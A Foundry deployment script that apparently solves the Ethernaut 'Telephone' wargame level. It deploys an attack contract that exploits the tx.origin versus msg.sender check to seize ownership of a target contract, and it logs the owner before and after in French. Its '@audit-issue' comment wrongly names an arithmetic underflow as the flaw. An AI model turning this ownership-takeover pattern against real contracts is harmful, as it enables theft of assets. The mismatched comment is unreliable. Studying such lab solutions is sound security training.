// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/TelephoneAttack.sol";

// @audit-issue vulnerable to arithmetic underflow

contract SolveTelephone is Script {

    function run() external {
        address target = 0x0Be7e861A90ff8e71e3472687aFF38Aa0Cf22025;
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        console.log("L'owner avant est: ", ITelephone(target).owner());

        TelephoneAttack attacker = new TelephoneAttack();

        attacker.attack(target);

        console.log("L'owner apres est: ", ITelephone(target).owner());

        console.log("Le msg.sender est :", address(attacker));
        console.log("Le tx.origin est : ", vm.addr(privateKey));

        vm.stopBroadcast();
    }
}